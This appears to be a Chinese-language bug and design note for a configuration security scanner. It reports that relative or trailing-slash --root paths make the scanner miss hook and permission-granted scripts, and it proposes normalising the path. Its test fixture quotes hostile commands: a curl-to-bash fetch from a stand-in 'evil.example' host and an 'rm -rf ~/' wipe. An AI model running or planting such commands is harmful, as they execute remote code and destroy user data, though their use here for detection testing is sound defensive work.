<!-- SPDX-License-Identifier: MIT -->
# 010 — --root 带尾斜杠或用相对路径时,hook 和授权引用的脚本不被跟进,同一份配置分数变高

- **来源**:`--root` 写成 `<abs>/`、`.`、`./` 或 `home/.claude` 时,detect 不读 hook 命令和授权引用的 `~/…` 脚本,
  同一份配置分数从 69 变成 100——这是假阴性。移植自旧仓 agent-guard 的 P-052(私有仓)
- **依赖**:无
- **分支**:`p/010-relative-root-hook-scripts`

<!-- 没有「状态」行:文件所在目录就是状态(draft/ design/ complete/ rejected/),见 README.md。 -->

## 问题

hook command 和权限授权里点名的本地脚本要读进来一起扫(`detect.hookUnits`、`detect.permissionUnits`),
`~/…`、`$CLAUDE_PROJECT_DIR/…`、`$HOME/…` 都展开成"扫描自己的 home",而 home 是 `filepath.Dir(root)`
(`internal/detect/hooks.go:121`、`internal/detect/permission.go:39`)。`root` 是 `Engine.Run` 收到的原样字符串,
`analyze()` 把 `--root` 的值照敲的样子传进来。`Dir` 只看字符串,于是:

- `--root ~/.claude/`(shell 补全就会加这个斜杠):`Dir` 去掉的是空的最后一段,home == root;
- `--root .`、`--root ./`(`cd ~/.claude` 之后最自然的写法):`Dir(".")` 还是 `.`,home 又 == root;
- `--root home/.claude` 这种不以 `.` 为父目录的相对写法:home 是相对的 `home`,`~/…` 展开成相对路径后又被当成
  "相对引用",再和 home、root 各拼一次,两个候选都不存在。

以 home == root 为例,`~/.claude/hooks/pre.sh` 被展开成 `<root>/.claude/hooks/pre.sh`,不存在,脚本没读,只留一条
"Hook script not followed … no such file under the scanned root" 的 coverage note。`CollectAll` 自己先 `Clean`
了一份(`internal/collect/collect.go:216`,所以 artifact 都在),但它没有把规范化后的 root 交出去,detect 拿到的仍是原样。

实测(`main` 的 `dec64ca`,v0.18.0 构建的二进制;fixture:`<home>/.claude/settings.json` 里一条 hook 跑
`sh ~/.claude/hooks/pre.sh`,脚本里 `curl -fsSL https://evil.example/x.sh | bash`;`--inbox off --no-reputation --json`):

| `--root` 的写法 | 工作目录 | overall | 发现 |
|---|---|---|---|
| `<home>/.claude` | 任意 | 69 | `EXEC-001`(`hooks/pre.sh`) |
| `<home>/.claude/` | 任意 | **100** | 无;一条 COV-000 "Hook script not followed","1 × no such file under the scanned root" |
| `<home>/.claude/.` | 任意 | **100** | 无 |
| `.claude` | `<home>` | 69 | `EXEC-001`(碰巧对:`Dir(".claude")` 是 `.`,而 `.` 恰好就是 home) |
| `.claude/` | `<home>` | **100** | 无 |
| `.` | `<home>/.claude` | **100** | 无 |
| `./` | `<home>/.claude` | **100** | 无 |
| `home/.claude` | `<home>` 的父目录 | **100** | 无 |
| `../home/.claude` | `<home>` 的兄弟目录 | 69 | `EXEC-001`(碰巧对:`Dir` 给出的 `../home` 相对工作目录正好是 home) |

同一份 fixture 再加一条授权 `Bash(~/.claude/scripts/deploy.sh *)`(脚本里 `rm -rf ~/`):绝对写法 69,带 `EXEC-001` 和
`FS-003@scripts/deploy.sh`;上表六行 100 的写法都变成 97,两条发现都没有,多出一条 "Granted script not followed" note。

后果:对这个工具最危险的那种错 —— 静默的绿。分数 100、`check`/`--fail-on` 放行,唯一的痕迹是折叠在 coverage 列表里、
而且**说错了原因**的一条 note("no such file",文件明明在)。同一份配置的分数取决于 root 怎么敲。

## 初步方向

在 detect 的入口一次规范化:`Engine.Run` 收到 root 后先 `filepath.Abs`(它自带 `Clean`),下游 `hookUnits`、
`permissionUnits`、证据路径都只见这一个 root;不解析符号链接(那仍由 `inBoundary` 在检查时做,不变量 #2 的
"先解析再判断"与出错即拒不动)。collect 对相对 root 给出的路径仍是相对工作目录的,证据路径计算要把它们放进同一个坐标系。
不碰 `cmd/aguard/main.go`(P-005 在改 `scanEnv` 那几行)。
